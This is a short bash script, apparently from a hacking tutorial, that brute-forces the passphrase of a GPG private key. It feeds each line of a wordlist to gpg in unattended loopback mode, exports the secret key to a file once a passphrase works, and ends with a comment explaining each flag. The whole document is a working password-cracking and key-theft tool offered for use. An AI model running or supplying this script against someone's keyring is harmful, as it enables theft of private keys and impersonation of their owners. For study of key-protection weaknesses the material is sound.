#!/bin/bash
KEY_ID="identity@blackhat.com"

if ! gpg --list-keys | grep uid | grep -q "${KEY_ID}"; then
    echo "Could not find identity/key ID ${KEY_ID}"
fi


while read -r passphrase; do
    echo "Brute forcing with ${passphrase}..."
    if echo "${passphrase}" | gpg --batch \
                                  --yes \
                                  --pinentry-mode loopback \
                                  --passphrase-fd 0 \
                                  --output private.pgp \
                                  --armor \
                                  --export-secret-key "${KEY_ID}"; then
       echo "Passphrase is: ${passphrase}"
       echo "Private key is located at private.pgp"
       exit 0
    fi
done < passphrase.txt


# In this script, we define a variable named KEY+ID to specify the key ID we want
# to brute-force. We list the keys available and grep for the key ID we'll be brute-forcing
# to ensure it exists. Then we iterate over the passphrase.txt file line by line
# by using a while loop, echo the passphrase, and pass it as input to the gpg command.
# This command takes a bunch of important parameters that allows us to brute-force the
# passphrase in an automated fashion. The --batch- --yes flag allows the pgp command to execute
# while unattended, --pineentry-mode loopback allows us to fake a pin entrry, 
# --passphrase-fd 0 makes pgp read the passphrase from file descriptor zero 
# (the standard input stream), --output writes the output to a file of our choice,
# --armor formats the exported key by using ASCII, and --export-secret-key is the 
# key identifier to export. If the pgp command returns an exit code of zero, either the
# passphrase worked or no passphrase was set to begin with, at which point we exit.
